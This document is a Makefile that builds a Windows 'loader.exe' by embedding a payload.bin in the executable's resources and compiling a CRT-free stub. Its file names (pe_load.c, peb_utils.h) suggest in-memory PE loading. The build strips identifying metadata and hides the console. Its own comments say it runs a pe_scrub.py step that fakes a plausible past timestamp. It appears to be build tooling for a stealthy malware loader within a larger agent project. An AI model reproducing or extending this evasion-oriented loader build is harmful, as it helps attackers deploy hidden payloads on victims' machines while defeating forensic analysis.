ifeq ($(OS),Windows_NT)
  MSYS2   ?= C:/msys64/mingw64
  CC      ?= $(MSYS2)/bin/gcc.exe
  STRIP   ?= $(MSYS2)/bin/strip.exe
  OBJCOPY ?= $(MSYS2)/bin/objcopy.exe
  WINDRES ?= $(MSYS2)/bin/windres.exe
  PYTHON  ?= python
  export TMP  := $(or $(TMP),$(TEMP),C:/Windows/Temp)
  export TEMP := $(TMP)
else
  CC      ?= x86_64-w64-mingw32-gcc
  STRIP   ?= x86_64-w64-mingw32-strip
  OBJCOPY ?= x86_64-w64-mingw32-objcopy
  WINDRES ?= x86_64-w64-mingw32-windres
  PYTHON  ?= python3
endif

TARGET  = loader.exe
RES_SRC = ../res/loader.rc
RES_OBJ = loader_res.o

# -nostdlib       : no CRT — import table = KERNEL32 only
# -fno-builtin    : prevents GCC from emitting implicit memcpy/memset calls
# -fno-ident      : removes GCC version string from .comment
# -fno-asynchronous-unwind-tables : removes .eh_frame
# -fno-stack-protector: removes __stack_chk_fail import
CFLAGS = -O2 -Wall -Wextra -DNDEBUG -DWIN32_LEAN_AND_MEAN \
         -fno-ident -fno-asynchronous-unwind-tables \
         -fno-stack-protector -fno-builtin \
         -Wno-cast-function-type -nostdlib

# --entry         : custom entry, bypass CRT WinMainCRTStartup wrapper
# -subsystem      : GUI — no console window
# --no-insert-timestamp : ld skips timestamp (pe_scrub sets a plausible past date)
# -lkernel32      : VirtualAlloc, ExitProcess, Find/Load/Lock/SizeofResource
LDFLAGS = -Wl,--entry,WinMainCRTStartup \
          -Wl,-subsystem,windows \
          -Wl,--no-insert-timestamp \
          -lkernel32

SRCS = stub.c pe_load.c

.PHONY: all clean

all: payload_meta.h payload.bin $(RES_OBJ) $(TARGET)

# payload.bin is embedded into .rsrc via windres — must exist before $(RES_OBJ)
$(RES_OBJ): $(RES_SRC) ../res/loader.manifest payload.bin
	$(WINDRES) -i $(RES_SRC) --input-format=rc -o $(RES_OBJ) --output-format=coff

$(TARGET): $(SRCS) peb_utils.h pe_load.h payload_meta.h $(RES_OBJ)
	$(CC) $(CFLAGS) -o $@ $(SRCS) $(RES_OBJ) $(LDFLAGS)
	$(STRIP) --strip-all $(TARGET)
	$(OBJCOPY) --strip-debug $(TARGET)
	$(PYTHON) ../../agent/tools/pe_scrub.py $(TARGET)
	@echo "[ok] $(TARGET)"

payload_meta.h:
	$(error payload files missing -- run: python build.py --bake-only)

payload.bin: payload_meta.h

clean:
ifeq ($(OS),Windows_NT)
	del /Q $(TARGET) $(RES_OBJ) payload_meta.h payload.bin 2>nul & exit 0
else
	rm -f $(TARGET) $(RES_OBJ) payload_meta.h payload.bin
endif
